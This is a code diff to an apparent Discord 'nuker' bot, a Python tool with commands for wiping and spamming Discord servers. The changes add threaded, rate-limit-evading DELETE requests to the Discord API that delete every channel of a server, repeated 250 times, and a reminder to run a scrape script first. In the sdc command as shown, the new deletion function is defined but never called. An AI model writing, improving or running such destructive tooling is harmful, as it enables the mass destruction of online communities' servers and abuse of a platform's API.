@@ -1,4 +1,4 @@
-import sys, discord, requests, json, threading, random, asyncio,aiohttp
+import sys, discord, requests, json, threading, random, asyncio,aiohttp, time
 from discord.ext import commands
 import colorama
 from colorama import Fore, Style, Back
@@ -54,6 +54,7 @@ $$ |   $$ |  $$ |  $$ |  $$ |$$ |      $$ |  $$ |      $$$$\ $$ |$$ |$$  / $$ | 
     print(Fore.GREEN+"Commands - nuke,scc,sdc,sdr,scr,spam,swh")
     print(Fore.GREEN+f"Logged in as {bot.user.name}")
     print(Fore.GREEN+f"Prefix - {prefix}")
+    print("Remember to Use scrape.py before running the nuker")
 
 def logo():
     print(f"Logged in as {bot.user.name}")
@@ -107,8 +108,14 @@ async def sdr(ctx):
 async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild.id
-    for channel in list(ctx.guild.channels):
-        await channel.delete()
+    def channel_delete(u):
+      while True:
+        r = requests.delete(f"https://discord.com/api/v8/channels/{u}", headers=headers)
+        if 'retry_after' in r.text:
+            time.sleep(r.json()['retry_after'])
+            print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
+        else:
+          break
     def cc(i):
         json = {
           "name": i
@@ -121,7 +128,7 @@ async def nuke(ctx):
     for i in range(250):
            for channel in list(ctx.guild.channels):   
                threading.Thread(
-                    target=dc,
+                    target=channel_delete,
                     args=(channel.id, )
                ).start()
     for i in range(250):
@@ -132,8 +139,14 @@ async def nuke(ctx):
 
 @bot.command()
 async def sdc(ctx):
-    for channel in list(ctx.guild.channels):
-        await channel.delete()
+    def channel_delete(u):
+      while True:
+        r = requests.delete(f"https://discord.com/api/v8/channels/{u}", headers=headers)
+        if 'retry_after' in r.text:
+            time.sleep(r.json()['retry_after'])
+            print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
+        else:
+          break
 
 @bot.command()
 async def spam(ctx):
